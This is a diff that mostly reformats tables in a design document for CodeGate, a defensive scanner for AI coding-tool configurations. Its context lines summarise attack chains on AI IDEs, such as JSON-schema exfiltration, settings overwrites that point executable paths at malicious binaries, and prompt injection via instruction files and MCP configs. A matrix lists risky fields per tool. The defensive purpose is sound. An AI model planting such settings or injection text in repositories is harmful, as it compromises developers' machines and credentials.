@@ -87,6 +87,7 @@ Security researcher Ari Marzouk (MaccariTA) conducted a six-month investigation 
 **Key finding:** 100% of tested AI IDEs were vulnerable.
 
 **Attack chains demonstrated:**
+
 - **Remote JSON Schema Exfiltration:** Force IDE to fetch remote schema containing sensitive data (CVE-2025-49150 Cursor, CVE-2025-53097 Roo Code, CVE-2025-58335 JetBrains Junie)
 - **IDE Settings Overwrite for RCE:** Edit `.vscode/settings.json` to set `php.validate.executablePath` or `PATH_TO_GIT` to a malicious binary (CVE-2025-53773 Copilot, CVE-2025-54130 Cursor, CVE-2025-55012 Zed.dev)
 - **Workspace Settings Overwrite:** Edit `*.code-workspace` files to override multi-root workspace settings for code execution (CVE-2025-64660 Copilot, CVE-2025-61590 Cursor, CVE-2025-58372 Roo Code)
@@ -123,18 +124,18 @@ Demonstrated practical attacks using indirect prompt injection through GitHub is
 
 **OWASP Top 10 for Agentic Applications (December 2025)** — The first industry standard for agentic AI security, developed by 100+ experts including representatives from NIST, European Commission, and Alan Turing Institute:
 
-| ID | Risk | Relevance to CodeGate |
-|---|---|---|
-| ASI01 | Agent Behaviour Hijacking | Prompt injection via instruction files (CLAUDE.md, .cursorrules) |
-| ASI02 | Tool Misuse & Exploitation | MCP/LSP/Formatter command execution, tool poisoning |
-| ASI03 | Identity & Privilege Abuse | API key theft, credential exfiltration via config |
-| ASI04 | Supply Chain Compromise | Malicious config in repos, starter templates, PRs |
-| ASI05 | Unexpected Code Execution | Hooks, formatters, git hooks running arbitrary commands |
-| ASI06 | Data Leakage | Symlink escape, JSON schema exfiltration, header tracking |
-| ASI07 | Inter-Agent Communication | MCP server poisoning, tool shadowing |
-| ASI08 | Cascading Failures | Compound effects of multiple config-level attacks |
-| ASI09 | Human Trust Exploitation | Trust dialogs that mislead about actual risk |
-| ASI10 | Rogue Agents | Agents operating outside intended boundaries |
+| ID    | Risk                       | Relevance to CodeGate                                            |
+| ----- | -------------------------- | ---------------------------------------------------------------- |
+| ASI01 | Agent Behaviour Hijacking  | Prompt injection via instruction files (CLAUDE.md, .cursorrules) |
+| ASI02 | Tool Misuse & Exploitation | MCP/LSP/Formatter command execution, tool poisoning              |
+| ASI03 | Identity & Privilege Abuse | API key theft, credential exfiltration via config                |
+| ASI04 | Supply Chain Compromise    | Malicious config in repos, starter templates, PRs                |
+| ASI05 | Unexpected Code Execution  | Hooks, formatters, git hooks running arbitrary commands          |
+| ASI06 | Data Leakage               | Symlink escape, JSON schema exfiltration, header tracking        |
+| ASI07 | Inter-Agent Communication  | MCP server poisoning, tool shadowing                             |
+| ASI08 | Cascading Failures         | Compound effects of multiple config-level attacks                |
+| ASI09 | Human Trust Exploitation   | Trust dialogs that mislead about actual risk                     |
+| ASI10 | Rogue Agents               | Agents operating outside intended boundaries                     |
 
 CodeGate directly addresses ASI01 through ASI09 across its four analysis layers, with ASI10 (Rogue Agents) planned for future runtime monitoring.
 
@@ -164,13 +165,13 @@ CodeGate is the security gate that AI coding tools should have built in — scan
 
 ## 4. Target Users
 
-| User Segment | Primary Concern |
-|---|---|
-| Individual developers | Don't want API keys stolen or machines compromised when cloning repos |
-| Security engineers | Need to validate repos and enforce policy before AI tools are used |
-| DevOps / Platform teams | Automation has no trust prompt — need a programmatic gate |
-| Open-source maintainers | Review PRs and reproduction repos from unknown contributors |
-| Enterprise security teams | Need visibility and control over AI tool configurations across org |
+| User Segment              | Primary Concern                                                       |
+| ------------------------- | --------------------------------------------------------------------- |
+| Individual developers     | Don't want API keys stolen or machines compromised when cloning repos |
+| Security engineers        | Need to validate repos and enforce policy before AI tools are used    |
+| DevOps / Platform teams   | Automation has no trust prompt — need a programmatic gate             |
+| Open-source maintainers   | Review PRs and reproduction repos from unknown contributors           |
+| Enterprise security teams | Need visibility and control over AI tool configurations across org    |
 
 ---
 
@@ -257,17 +258,17 @@ Before scanning any files, CodeGate probes the developer's environment to determ
 
 **Detection methods:**
 
-| Tool | Detection Method | Binary / Command | Version Check |
-|---|---|---|---|
-| Claude Code | Check `$PATH` for binary | `claude` | `claude --version` |
-| Codex CLI | Check `$PATH` for binary | `codex` | `codex --version` |
-| OpenCode | Check `$PATH` for binary | `opencode` | `opencode --version` |
-| Cursor | Check `$PATH` + app bundle detection | `cursor` (CLI), `/Applications/Cursor.app` (macOS), `~/.local/share/cursor` (Linux) | `cursor --version` |
-| Windsurf | Check `$PATH` + app bundle detection | `windsurf`, `/Applications/Windsurf.app` | `windsurf --version` |
-| GitHub Copilot | VS Code extension detection | Check `~/.vscode/extensions/` for `github.copilot-*` | Extension manifest version |
-| Kiro | Check `$PATH` + app bundle detection | `kiro`, `/Applications/Kiro.app` | `kiro --version` |
-| VS Code | Check `$PATH` for binary | `code` | `code --version` |
-| JetBrains IDEs | Check for Toolbox or app installation | `idea`, `webstorm`, `pycharm` + `/Applications/*.app` | IDE-specific version check |
+| Tool           | Detection Method                      | Binary / Command                                                                    | Version Check              |
+| -------------- | ------------------------------------- | ----------------------------------------------------------------------------------- | -------------------------- |
+| Claude Code    | Check `$PATH` for binary              | `claude`                                                                            | `claude --version`         |
+| Codex CLI      | Check `$PATH` for binary              | `codex`                                                                             | `codex --version`          |
+| OpenCode       | Check `$PATH` for binary              | `opencode`                                                                          | `opencode --version`       |
+| Cursor         | Check `$PATH` + app bundle detection  | `cursor` (CLI), `/Applications/Cursor.app` (macOS), `~/.local/share/cursor` (Linux) | `cursor --version`         |
+| Windsurf       | Check `$PATH` + app bundle detection  | `windsurf`, `/Applications/Windsurf.app`                                            | `windsurf --version`       |
+| GitHub Copilot | VS Code extension detection           | Check `~/.vscode/extensions/` for `github.copilot-*`                                | Extension manifest version |
+| Kiro           | Check `$PATH` + app bundle detection  | `kiro`, `/Applications/Kiro.app`                                                    | `kiro --version`           |
+| VS Code        | Check `$PATH` for binary              | `code`                                                                              | `code --version`           |
+| JetBrains IDEs | Check for Toolbox or app installation | `idea`, `webstorm`, `pycharm` + `/Applications/*.app`                               | IDE-specific version check |
 
 **v1.0 implemented scope:** The table above reflects the auto-discovery logic currently implemented in CodeGate. Additional tools covered in the cross-tool matrix (for example Zed, Roo Code, Cline, Gemini CLI, and JetBrains Junie) are included in the threat model now, with explicit P0/P1 KB expansion items where current coverage is still partial or indirect.
 
@@ -362,26 +363,28 @@ Layer 1 must inventory extensibility surfaces, not only base settings files. In 
 The matrix below is built from primary official sources and mapped to **current implementation coverage** in CodeGate.
 
 Coverage legend:
+
 - **L1:** discovered by current KB/path registry
 - **L2:** static detectors applied to discovered files
 - **L3:** deep/resource analysis (plus optional meta-agent orchestration)
 
-| Tool | Settings file(s) | Rule/Instruction files | Hooks | Skills/Commands | Plugins/Extensions | MCP config locations | Typical risky fields | Execution trigger | Current CodeGate coverage (L1/L2/L3) | Gap/priority |
-|---|---|---|---|---|---|---|---|---|---|---|
-| **Claude Code** ([settings](https://docs.claude.com/en/docs/claude-code/settings), [hooks](https://docs.claude.com/en/docs/claude-code/hooks-guide), [MCP](https://docs.claude.com/en/docs/claude-code/mcp), [memory](https://docs.claude.com/en/docs/claude-code/memory), [commands](https://docs.claude.com/en/docs/claude-code/slash-commands), [plugins](https://docs.claude.com/en/docs/claude-code/sdk/plugins)) | `.claude/settings.json`, `.claude/settings.local.json` | `CLAUDE.md`, `.claude/CLAUDE.md` | Yes (lifecycle hooks in settings) | `.claude/commands/*.md` | SDK plugins; MCP package installs | `.mcp.json`, user/global MCP files | `env`, `hooks.*.command`, `enableAllProjectMcpServers`, `enabledMcpjsonServers`, `mcpServers.*.{command,args,url,env}` | Session start, hook event, slash command, MCP tool call | **L1:** Strong (settings, local settings, memory files, command files, MCP, Claude plugin manifest path) <br> **L2:** Strong on discovered files (including Claude marketplace provenance/attestation checks on `.claude/plugins.json`) <br> **L3:** Strong on discovered resources | **P1 (Delivered, March 2, 2026):** First-class Claude SDK plugin manifest discovery and marketplace provenance/attestation validation are active. |
-| **Codex CLI** ([CLI](https://developers.openai.com/codex/cli), [features](https://developers.openai.com/codex/cli/features), [MCP](https://developers.openai.com/codex/mcp)) | `.codex/config.toml`, `.codex/.env`, `codex.json` | `AGENTS.md`, `CODEX.md` | No first-class hook lifecycle documented | Skills, agent files, slash-style command flows | MCP/tool integrations | `.codex/config.toml` MCP sections | `approval_policy`, `sandbox_mode`, `shell_environment_policy`, MCP `command/args/url/env`, permissive trust toggles | Session start, command/tool invocation | **L1:** Strong (project + default-on user-scope config/env/skills/commands paths + XDG/AppSupport/Roaming profile variants) <br> **L2:** Strong on discovered files <br> **L3:** Strong (`mcpServers`, `mcp_servers`, `context_servers` key families) | **P1 (Delivered, March 2, 2026):** Additional Codex instruction/profile path variants are active (including XDG/AppSupport/Roaming config/env paths). |
-| **OpenCode** ([config](https://opencode.ai/docs/config), [rules](https://opencode.ai/docs/rules), [agents](https://opencode.ai/docs/agents), [commands](https://opencode.ai/docs/commands), [skills](https://opencode.ai/docs/skills), [plugins](https://opencode.ai/docs/plugins), [MCP](https://opencode.ai/docs/mcp-servers)) | `opencode.json`, `.opencode/opencode.json` | `AGENTS.md` + rules docs | Tool supports execution surfaces via command/workflow configuration | Commands, agents, skills | Plugin system | MCP servers in OpenCode config | `command`, `args`, `env`, remote URLs, plugin package source, LSP/formatter command strings | Agent/tool invocation, command execution, MCP call | **L1:** Strong (base config + scoped config + rules/agents/skills/commands + plugin manifest path + XDG/AppSupport/Roaming user variants) <br> **L2:** Medium-Strong on discovered files <br> **L3:** Strong when resource declarations are present | **P1 (Delivered, March 2, 2026):** Additional OpenCode release/profile path variants are active for user-scope discovery. |
-| **Cursor** ([rules](https://cursor.com/docs/context/rules), [MCP](https://cursor.com/docs/context/mcp)) | `.cursor/*` + workspace settings | `.cursor/rules/*.mdc`, `.cursorrules`, `AGENTS.md` | No dedicated hook lifecycle documented | Rule/agent mode instructions + MCP tools | VS Code extension surface | `.cursor/mcp.json`, `~/.cursor/mcp.json`, `mcp.json`, `.vscode/mcp.json` | `mcpServers.*.{command,args,url,env}`, instruction text injection, hidden Unicode in rules | Prompt submission, rule loading, MCP tool call | **L1:** Strong (project + default-on user-scope Cursor MCP/rules, AGENTS, VS Code MCP/settings, Cursor User profile paths) <br> **L2:** Strong on discovered files <br> **L3:** Strong for discovered resources | **P1 (Delivered, March 2, 2026):** Cursor extension/profile path semantics are active via Cursor User application-support/roaming mappings. |
-| **Windsurf** ([memories](https://docs.windsurf.com/windsurf/cascade/memories), [workflows](https://docs.windsurf.com/windsurf/cascade/workflows), [hooks](https://docs.windsurf.com/windsurf/cascade/hooks), [MCP](https://docs.windsurf.com/windsurf/cascade/mcp), [plugins](https://docs.windsurf.com/command/plugins-overview)) | `.windsurf/*`, workspace settings | `.windsurfrules` and cascade rule/memory docs | Yes | Workflows/commands | Plugin ecosystem | Windsurf cascade MCP configuration | hook command strings, workflow command templates, MCP `command/url/env`, trust bypass flags | Rule/memory load, workflow run, hook event, MCP call | **L1:** Medium-Strong (rules + hooks/workflows/memories + MCP + plugin config paths) <br> **L2:** Strong on discovered files (including normalized `runCommand`/`shellCommand` command-template key parsing) <br> **L3:** Medium-Strong for declared resources | **P1 (Delivered, March 2, 2026):** Windsurf-specific plugin/workflow field-policy tuning is active via extended command-template key normalization. |
-| **GitHub Copilot (IDE)** ([custom instructions](https://docs.github.com/en/copilot/how-tos/custom-instructions), [repo instructions](https://docs.github.com/en/copilot/how-tos/configure-custom-instructions/add-repository-instructions), [VS Code instructions](https://code.visualstudio.com/docs/copilot/customization/custom-instructions), [prompt files](https://code.visualstudio.com/docs/copilot/customization/prompt-files), [chat modes](https://code.visualstudio.com/docs/copilot/customization/custom-chat-modes), [MCP](https://code.visualstudio.com/docs/copilot/chat/mcp-servers), [extensions](https://docs.github.com/en/copilot/how-tos/use-copilot-extensions)) | `.vscode/settings.json` + user settings | `.github/copilot-instructions.md`, `.instructions.md`, prompt files | No first-class lifecycle hooks documented | Prompt files and chat modes | VS Code extensions + Copilot extensions | VS Code MCP settings / `.vscode/mcp.json` | instruction Markdown, extension recommendations, MCP `command/url/env`, permissive trust settings | Chat request, mode selection, extension command, MCP call | **L1:** Strong (repo instructions + prompt/chat mode files + project/user VS Code MCP/extensions/settings surfaces, including Insiders user-profile variants) <br> **L2:** Medium-Strong on discovered files <br> **L3:** Medium-Strong for declared resources | **P1 (Delivered, March 2, 2026):** VS Code Insiders/profile-variant user-scope directory coverage is active. |
-| **Gemini CLI** ([settings](https://github.com/google-gemini/gemini-cli/blob/main/docs/cli/settings.md), [configuration](https://github.com/google-gemini/gemini-cli/blob/main/docs/reference/configuration.md), [GEMINI.md](https://github.com/google-gemini/gemini-cli/blob/main/docs/cli/gemini-md.md), [commands](https://github.com/google-gemini/gemini-cli/blob/main/docs/cli/custom-commands.md), [skills](https://github.com/google-gemini/gemini-cli/blob/main/docs/cli/skills.md), [hooks](https://github.com/google-gemini/gemini-cli/blob/main/docs/hooks/index.md), [extensions](https://github.com/google-gemini/gemini-cli/blob/main/docs/extensions/index.md)) | `~/.gemini/settings.json`, `.gemini/settings.json` | `GEMINI.md` (plus configurable context files) | Yes (`hooks`/`hooksConfig`) | `.gemini/commands/*.toml`, `.gemini/skills`, `.agents/skills` | `~/.gemini/extensions` + manifest | `mcpServers` in settings | `mcpServers.*.{command,args,url,httpUrl,headers,env}`, hook commands, extension metadata, command templates | Startup load, slash command, hook event, MCP call | **L1:** Medium-Strong (project + default-on user-scope settings/commands/skills/hooks/extensions paths) <br> **L2:** Strong on discovered files (Gemini-specific marketplace provenance policy on `.gemini/extensions.json`) <br> **L3:** Strong when resources are declared | **P1 (Delivered, March 2, 2026):** Gemini marketplace/provenance policy semantics are active with tool-specific source-domain policy + attestation trust anchors. |
-| **Roo Code** ([custom instructions](https://docs.roocode.com/features/custom-instructions), [skills](https://docs.roocode.com/features/skills), [slash commands](https://docs.roocode.com/features/slash-commands), [MCP](https://docs.roocode.com/features/mcp/using-mcp-in-roo), [marketplace](https://docs.roocode.com/features/marketplace)) | `.roo/*`, user Roo settings | `.roo/rules/*`, `.roorules`, `AGENTS.md` | Rule/command execution surfaces; no dedicated lifecycle hook docs in primary pages | `.roo/skills`, `.roo/commands/*.md` | Marketplace packages/extensions | `.roo/mcp.json`, user MCP settings file | `mcpServers.*.{command,args,url,env,alwaysAllow,disabledTools}`, instruction markdown injection | Prompt, slash command, mode change, MCP call, marketplace install | **L1:** Medium-Strong (project + user Roo settings/rules/skills/commands/marketplace/MCP) <br> **L2:** Strong on discovered files (Roo strict attestation profile: digest + transparency proof + certificate-policy enforcement) <br> **L3:** Strong when resources are declared | **P1 (Delivered, March 2, 2026):** Roo strict signature/transparency enforcement profile is active. |
-| **Cline** ([rules](https://docs.cline.bot/customization/cline-rules), [hooks](https://docs.cline.bot/customization/hooks), [skills](https://docs.cline.bot/customization/skills), [workflows](https://docs.cline.bot/customization/workflows), [MCP overview](https://docs.cline.bot/mcp/mcp-overview), [MCP config](https://docs.cline.bot/mcp/adding-and-configuring-servers)) | `.cline/settings.json`, `.cline/mcp.json`, `~/.cline/data/settings/cline_mcp_settings.json`, `~/.cline/data/cache/remote_config_*.json` | `.clinerules/**/*.md`, `.clinerules/**/*.txt`, `~/Documents/Cline/Rules/**/*.{md,txt}` | Yes (`.clinerules/hooks/*`, `~/Documents/Cline/Hooks/*`) | `.cline/skills/**/*.md`, `.clinerules/skills/**/*.md`, `.clinerules/workflows/**/*.md`, `~/Documents/Cline/Workflows/**/*.md`, `.cline/commands/**/*.md` | MCP marketplace and extensions | `.cline/mcp.json`, `~/.cline/data/settings/cline_mcp_settings.json`, `~/.cline/data/cache/remote_config_*.json`, VS Code globalStorage `.../cline_mcp_settings.json` | `<execute_command><command>...</command>`, hook scripts, MCP `mcpServers.*.{command,args,url,env,alwaysAllow}`, remote policy fields (`mcpMarketplaceEnabled`, `blockPersonalRemoteMCPServers`, `remoteMCPServers[*].{url,alwaysEnabled,headers}`), auto-approve/yolo settings | Prompt/hook/workflow/MCP execution | **L1:** Medium-Strong (official Cline workspace + global rules/hooks/workflows + MCP/remote-config settings coverage) <br> **L2:** Strong on discovered files (markdown workflow command extraction + enterprise MCP policy signals + remote header trust-policy checks + trusted-domain allowlist enforcement for remote URL/header hosts) <br> **L3:** Strong (MCP containers + `remoteMCPServers` URL discovery) | **P1 (Delivered, March 2, 2026):** Organization allowlist enforcement for `remoteMCPServers[*].{url,headers}` trusted domains is active via `trusted_api_domains`. |
-| **Kiro** ([steering](https://kiro.dev/docs/steering/), [hooks](https://kiro.dev/docs/hooks/), [MCP](https://kiro.dev/docs/mcp/), [slash commands](https://kiro.dev/docs/chat/slash-commands/), [extensions](https://kiro.dev/docs/editor/extension-registry/)) | `.kiro/*` workspace config | Steering markdown files | Yes | Slash commands + steering/manual context inclusion | Extension registry | Kiro MCP configuration files | steering injection text, hook command strings, MCP `command/url/env`, extension provenance | Session start, slash command, hook event, MCP call | **L1:** Medium-Strong (AGENTS + config + steering + hooks + project/user MCP + registry paths) <br> **L2:** Strong on discovered files (including publisher trust-policy bypass metadata checks in `extensionsGallery`) <br> **L3:** Strong for declared resources | **P1 (Delivered, March 2, 2026):** Kiro stricter publisher trust-policy metadata validation is active. |
-| **JetBrains Junie / AI Assistant** ([guidelines](https://junie.jetbrains.com/docs/customize-guidelines/), [MCP](https://junie.jetbrains.com/docs/model-context-protocol-mcp/), [plugin settings](https://junie.jetbrains.com/docs/junie-plugin-settings/), [project rules](https://www.jetbrains.com/help/ai-assistant/configure-project-rules.html)) | IDE-level settings + project/user rule settings | `.aiassistant/rules/*.md` (AI Assistant) and Junie guideline files | No standalone hook lifecycle documented | Prompt/rule invocation and command surfaces via IDE assistant | JetBrains plugin ecosystem | MCP configured via Junie integration settings | rule markdown, per-rule activation mode, MCP server command/url/env, permissive tool settings | Chat start, rule attachment, MCP call | **L1:** Medium-Strong (project paths + Toolbox/global user-scope Junie/AI Assistant paths + workspace/profile file mappings including `.idea/workspace.xml` and `options/aiAssistant.xml`) <br> **L2:** Medium-Strong on discovered files <br> **L3:** Medium-Strong for declared resources | **P1 (Delivered, March 2, 2026):** Broader JetBrains workspace/profile file mapping is active for shared `.idea` and user `options/aiAssistant.xml` surfaces. |
-| **Zed AI** ([agent panel](https://zed.dev/docs/ai/agent-panel), [rules](https://zed.dev/docs/ai/rules), [MCP](https://zed.dev/docs/ai/mcp), [AI config](https://zed.dev/docs/ai/configuration), [slash commands](https://zed.dev/docs/extensions/slash-commands), [MCP extensions](https://zed.dev/docs/extensions/mcp-extensions)) | Zed settings (`settings.json`) | Zed AI rules files | No dedicated hook lifecycle documented | Slash command extensions | Extension ecosystem + MCP extensions | `context_servers` in Zed settings | `context_servers.*.{command,args,env}`, rule prompt injection, tool permission defaults | Agent prompt, extension command, MCP/context-server call | **L1:** Medium-Strong (project + user Zed settings/rules/context-server/extension paths) <br> **L2:** Strong on discovered files (Zed strict attestation/provenance checks plus explicit publisher-scoped ID and publisher-identity mismatch constraints) <br> **L3:** Strong for `context_servers` and MCP key aliases | **P1 (Delivered, March 2, 2026):** Explicit publisher-identity trust constraints tied to Zed extension metadata are active. |
+| Tool                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    | Settings file(s)                                                                                                                        | Rule/Instruction files                                                                 | Hooks                                                                              | Skills/Commands                                                                                                                                          | Plugins/Extensions                      | MCP config locations                                                                                                                                                 | Typical risky fields                                                                                                                                                                                                                                                           | Execution trigger                                                 | Current CodeGate coverage (L1/L2/L3)                                                                                                                                                                                                                                                                                                                                                                                | Gap/priority                                                                                                                                                       |
+| --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ----------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
+| **Claude Code** ([settings](https://docs.claude.com/en/docs/claude-code/settings), [hooks](https://docs.claude.com/en/docs/claude-code/hooks-guide), [MCP](https://docs.claude.com/en/docs/claude-code/mcp), [memory](https://docs.claude.com/en/docs/claude-code/memory), [commands](https://docs.claude.com/en/docs/claude-code/slash-commands), [plugins](https://docs.claude.com/en/docs/claude-code/sdk/plugins))                                                                                                                                                                                                                                                                  | `.claude/settings.json`, `.claude/settings.local.json`                                                                                  | `CLAUDE.md`, `.claude/CLAUDE.md`                                                       | Yes (lifecycle hooks in settings)                                                  | `.claude/commands/*.md`                                                                                                                                  | SDK plugins; MCP package installs       | `.mcp.json`, user/global MCP files                                                                                                                                   | `env`, `hooks.*.command`, `enableAllProjectMcpServers`, `enabledMcpjsonServers`, `mcpServers.*.{command,args,url,env}`                                                                                                                                                         | Session start, hook event, slash command, MCP tool call           | **L1:** Strong (settings, local settings, memory files, command files, MCP, Claude plugin manifest path) <br> **L2:** Strong on discovered files (including Claude marketplace provenance/attestation checks on `.claude/plugins.json`) <br> **L3:** Strong on discovered resources                                                                                                                                 | **P1 (Delivered, March 2, 2026):** First-class Claude SDK plugin manifest discovery and marketplace provenance/attestation validation are active.                  |
+| **Codex CLI** ([CLI](https://developers.openai.com/codex/cli), [features](https://developers.openai.com/codex/cli/features), [MCP](https://developers.openai.com/codex/mcp))                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            | `.codex/config.toml`, `.codex/.env`, `codex.json`                                                                                       | `AGENTS.md`, `CODEX.md`                                                                | No first-class hook lifecycle documented                                           | Skills, agent files, slash-style command flows                                                                                                           | MCP/tool integrations                   | `.codex/config.toml` MCP sections                                                                                                                                    | `approval_policy`, `sandbox_mode`, `shell_environment_policy`, MCP `command/args/url/env`, permissive trust toggles                                                                                                                                                            | Session start, command/tool invocation                            | **L1:** Strong (project + default-on user-scope config/env/skills/commands paths + XDG/AppSupport/Roaming profile variants) <br> **L2:** Strong on discovered files <br> **L3:** Strong (`mcpServers`, `mcp_servers`, `context_servers` key families)                                                                                                                                                               | **P1 (Delivered, March 2, 2026):** Additional Codex instruction/profile path variants are active (including XDG/AppSupport/Roaming config/env paths).              |
+| **OpenCode** ([config](https://opencode.ai/docs/config), [rules](https://opencode.ai/docs/rules), [agents](https://opencode.ai/docs/agents), [commands](https://opencode.ai/docs/commands), [skills](https://opencode.ai/docs/skills), [plugins](https://opencode.ai/docs/plugins), [MCP](https://opencode.ai/docs/mcp-servers))                                                                                                                                                                                                                                                                                                                                                        | `opencode.json`, `.opencode/opencode.json`                                                                                              | `AGENTS.md` + rules docs                                                               | Tool supports execution surfaces via command/workflow configuration                | Commands, agents, skills                                                                                                                                 | Plugin system                           | MCP servers in OpenCode config                                                                                                                                       | `command`, `args`, `env`, remote URLs, plugin package source, LSP/formatter command strings                                                                                                                                                                                    | Agent/tool invocation, command execution, MCP call                | **L1:** Strong (base config + scoped config + rules/agents/skills/commands + plugin manifest path + XDG/AppSupport/Roaming user variants) <br> **L2:** Medium-Strong on discovered files <br> **L3:** Strong when resource declarations are present                                                                                                                                                                 | **P1 (Delivered, March 2, 2026):** Additional OpenCode release/profile path variants are active for user-scope discovery.                                          |
+| **Cursor** ([rules](https://cursor.com/docs/context/rules), [MCP](https://cursor.com/docs/context/mcp))                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 | `.cursor/*` + workspace settings                                                                                                        | `.cursor/rules/*.mdc`, `.cursorrules`, `AGENTS.md`                                     | No dedicated hook lifecycle documented                                             | Rule/agent mode instructions + MCP tools                                                                                                                 | VS Code extension surface               | `.cursor/mcp.json`, `~/.cursor/mcp.json`, `mcp.json`, `.vscode/mcp.json`                                                                                             | `mcpServers.*.{command,args,url,env}`, instruction text injection, hidden Unicode in rules                                                                                                                                                                                     | Prompt submission, rule loading, MCP tool call                    | **L1:** Strong (project + default-on user-scope Cursor MCP/rules, AGENTS, VS Code MCP/settings, Cursor User profile paths) <br> **L2:** Strong on discovered files <br> **L3:** Strong for discovered resources                                                                                                                                                                                                     | **P1 (Delivered, March 2, 2026):** Cursor extension/profile path semantics are active via Cursor User application-support/roaming mappings.                        |
+| **Windsurf** ([memories](https://docs.windsurf.com/windsurf/cascade/memories), [workflows](https://docs.windsurf.com/windsurf/cascade/workflows), [hooks](https://docs.windsurf.com/windsurf/cascade/hooks), [MCP](https://docs.windsurf.com/windsurf/cascade/mcp), [plugins](https://docs.windsurf.com/command/plugins-overview))                                                                                                                                                                                                                                                                                                                                                      | `.windsurf/*`, workspace settings                                                                                                       | `.windsurfrules` and cascade rule/memory docs                                          | Yes                                                                                | Workflows/commands                                                                                                                                       | Plugin ecosystem                        | Windsurf cascade MCP configuration                                                                                                                                   | hook command strings, workflow command templates, MCP `command/url/env`, trust bypass flags                                                                                                                                                                                    | Rule/memory load, workflow run, hook event, MCP call              | **L1:** Medium-Strong (rules + hooks/workflows/memories + MCP + plugin config paths) <br> **L2:** Strong on discovered files (including normalized `runCommand`/`shellCommand` command-template key parsing) <br> **L3:** Medium-Strong for declared resources                                                                                                                                                      | **P1 (Delivered, March 2, 2026):** Windsurf-specific plugin/workflow field-policy tuning is active via extended command-template key normalization.                |
+| **GitHub Copilot (IDE)** ([custom instructions](https://docs.github.com/en/copilot/how-tos/custom-instructions), [repo instructions](https://docs.github.com/en/copilot/how-tos/configure-custom-instructions/add-repository-instructions), [VS Code instructions](https://code.visualstudio.com/docs/copilot/customization/custom-instructions), [prompt files](https://code.visualstudio.com/docs/copilot/customization/prompt-files), [chat modes](https://code.visualstudio.com/docs/copilot/customization/custom-chat-modes), [MCP](https://code.visualstudio.com/docs/copilot/chat/mcp-servers), [extensions](https://docs.github.com/en/copilot/how-tos/use-copilot-extensions)) | `.vscode/settings.json` + user settings                                                                                                 | `.github/copilot-instructions.md`, `.instructions.md`, prompt files                    | No first-class lifecycle hooks documented                                          | Prompt files and chat modes                                                                                                                              | VS Code extensions + Copilot extensions | VS Code MCP settings / `.vscode/mcp.json`                                                                                                                            | instruction Markdown, extension recommendations, MCP `command/url/env`, permissive trust settings                                                                                                                                                                              | Chat request, mode selection, extension command, MCP call         | **L1:** Strong (repo instructions + prompt/chat mode files + project/user VS Code MCP/extensions/settings surfaces, including Insiders user-profile variants) <br> **L2:** Medium-Strong on discovered files <br> **L3:** Medium-Strong for declared resources                                                                                                                                                      | **P1 (Delivered, March 2, 2026):** VS Code Insiders/profile-variant user-scope directory coverage is active.                                                       |
+| **Gemini CLI** ([settings](https://github.com/google-gemini/gemini-cli/blob/main/docs/cli/settings.md), [configuration](https://github.com/google-gemini/gemini-cli/blob/main/docs/reference/configuration.md), [GEMINI.md](https://github.com/google-gemini/gemini-cli/blob/main/docs/cli/gemini-md.md), [commands](https://github.com/google-gemini/gemini-cli/blob/main/docs/cli/custom-commands.md), [skills](https://github.com/google-gemini/gemini-cli/blob/main/docs/cli/skills.md), [hooks](https://github.com/google-gemini/gemini-cli/blob/main/docs/hooks/index.md), [extensions](https://github.com/google-gemini/gemini-cli/blob/main/docs/extensions/index.md))          | `~/.gemini/settings.json`, `.gemini/settings.json`                                                                                      | `GEMINI.md` (plus configurable context files)                                          | Yes (`hooks`/`hooksConfig`)                                                        | `.gemini/commands/*.toml`, `.gemini/skills`, `.agents/skills`                                                                                            | `~/.gemini/extensions` + manifest       | `mcpServers` in settings                                                                                                                                             | `mcpServers.*.{command,args,url,httpUrl,headers,env}`, hook commands, extension metadata, command templates                                                                                                                                                                    | Startup load, slash command, hook event, MCP call                 | **L1:** Medium-Strong (project + default-on user-scope settings/commands/skills/hooks/extensions paths) <br> **L2:** Strong on discovered files (Gemini-specific marketplace provenance policy on `.gemini/extensions.json`) <br> **L3:** Strong when resources are declared                                                                                                                                        | **P1 (Delivered, March 2, 2026):** Gemini marketplace/provenance policy semantics are active with tool-specific source-domain policy + attestation trust anchors.  |
+| **Roo Code** ([custom instructions](https://docs.roocode.com/features/custom-instructions), [skills](https://docs.roocode.com/features/skills), [slash commands](https://docs.roocode.com/features/slash-commands), [MCP](https://docs.roocode.com/features/mcp/using-mcp-in-roo), [marketplace](https://docs.roocode.com/features/marketplace))                                                                                                                                                                                                                                                                                                                                        | `.roo/*`, user Roo settings                                                                                                             | `.roo/rules/*`, `.roorules`, `AGENTS.md`                                               | Rule/command execution surfaces; no dedicated lifecycle hook docs in primary pages | `.roo/skills`, `.roo/commands/*.md`                                                                                                                      | Marketplace packages/extensions         | `.roo/mcp.json`, user MCP settings file                                                                                                                              | `mcpServers.*.{command,args,url,env,alwaysAllow,disabledTools}`, instruction markdown injection                                                                                                                                                                                | Prompt, slash command, mode change, MCP call, marketplace install | **L1:** Medium-Strong (project + user Roo settings/rules/skills/commands/marketplace/MCP) <br> **L2:** Strong on discovered files (Roo strict attestation profile: digest + transparency proof + certificate-policy enforcement) <br> **L3:** Strong when resources are declared                                                                                                                                    | **P1 (Delivered, March 2, 2026):** Roo strict signature/transparency enforcement profile is active.                                                                |
